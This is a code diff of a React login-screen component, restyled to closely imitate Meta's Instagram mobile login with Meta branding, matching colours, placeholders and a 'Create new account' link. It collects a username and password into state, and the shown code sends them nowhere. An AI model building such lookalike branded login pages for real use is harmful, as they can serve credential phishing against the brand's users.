@@ -47,57 +47,92 @@ function Screen1({ onNext }: { onNext: () => void }) {
 
   return (
     <>
-      <div className="flex flex-col items-center px-6" style={{ paddingTop: '15vh' }}>
+      {/* Top Bar — X close + Language */}
+      <div className="relative h-12 flex items-center px-4 shrink-0">
+        <button className="w-8 h-8 flex items-center justify-center">
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className="stroke-white" strokeWidth="2" strokeLinecap="round">
+            <path d="M2 2L14 14" />
+            <path d="M14 2L2 14" />
+          </svg>
+        </button>
+        <div className="absolute inset-0 flex items-center justify-center pr-8">
+          <span className="text-[#a8a8a8] text-[14px]" style={{ fontFamily: FONT }}>
+            English (India) ⌄
+          </span>
+        </div>
+      </div>
+
+      {/* Main Content */}
+      <div className="flex-1 flex flex-col items-center px-6" style={{ paddingTop: '18vh' }}>
         {/* Logo Placeholder */}
         <div
           className="shrink-0"
           style={{
-            width: 75,
-            height: 75,
-            borderRadius: 18,
-            marginBottom: 36,
+            width: 80,
+            height: 80,
+            borderRadius: 20,
+            marginBottom: 40,
             background: 'linear-gradient(135deg, #f97316, #ec4899, #a855f7)',
           }}
         />
 
         {/* Input Fields */}
-        <div className="w-full" style={{ maxWidth: 350 }}>
-          <div className="bg-[#2c2c2e] flex items-center" style={{ height: 50, borderRadius: 6, padding: 16, marginBottom: 12 }}>
+        <div className="w-full" style={{ maxWidth: 360 }}>
+          <div className="bg-transparent flex items-center" style={{ height: 56, borderRadius: 10, padding: 16, marginBottom: 14, border: '1px solid rgba(255,255,255,0.15)' }}>
             <input
               type="text"
-              placeholder="Username"
+              placeholder="Username, email address or mobile number"
               value={username}
               onChange={(e) => setUsername(e.target.value)}
-              className="w-full bg-transparent text-white text-[16px] outline-none placeholder:text-[#8e8e8e]"
+              className="w-full bg-transparent text-white text-[16px] outline-none placeholder:text-[#a8a8a8]"
+              style={{ fontFamily: FONT }}
             />
           </div>
-          <div className="bg-[#2c2c2e] flex items-center" style={{ height: 50, borderRadius: 6, padding: 16 }}>
+          <div className="bg-transparent flex items-center" style={{ height: 56, borderRadius: 10, padding: 16, border: '1px solid rgba(255,255,255,0.15)' }}>
             <input
               type="password"
               placeholder="Password"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
-              className="w-full bg-transparent text-white text-[16px] outline-none placeholder:text-[#8e8e8e]"
+              className="w-full bg-transparent text-white text-[16px] outline-none placeholder:text-[#a8a8a8]"
+              style={{ fontFamily: FONT }}
             />
           </div>
         </div>
 
         {/* Next Button */}
-        <div className="w-full" style={{ maxWidth: 350, marginTop: 14 }}>
+        <div className="w-full mt-4" style={{ maxWidth: 360 }}>
           <button
             onClick={onNext}
-            className="w-full bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#1565d8] text-white text-[17px] font-semibold transition-colors"
-            style={{ height: 52, borderRadius: 26 }}
+            className="w-full bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] text-white text-[16px] font-semibold transition-colors"
+            style={{ height: 52, borderRadius: 26, fontFamily: FONT }}
           >
             Next
           </button>
         </div>
 
         {/* Forgotten Password Link */}
-        <div className="flex justify-center" style={{ marginTop: 16 }}>
-          <button className="text-white text-[16px] font-medium" style={{ fontFamily: FONT }}>
+        <div className="mt-4 flex justify-center">
+          <button className="text-white text-[15px] font-medium" style={{ fontFamily: FONT }}>
             Forgotten password?
           </button>
+        </div>
+      </div>
+
+      {/* Bottom Section — Create new account + Meta */}
+      <div className="px-6 pb-4 shrink-0">
+        <div
+          className="w-full flex items-center justify-center"
+          style={{ height: 52, borderRadius: 26, border: '1px solid rgba(0,149,246,0.6)' }}
+        >
+          <span className="text-[#0095f6] text-[15px] font-medium" style={{ fontFamily: FONT }}>
+            Create new account
+          </span>
+        </div>
+        <div className="flex justify-center mt-4 pb-2">
+          <span className="text-[#a8a8a8] text-[14px] font-medium" style={{ fontFamily: FONT }}>
+            Meta
+          </span>
         </div>
       </div>
     </>
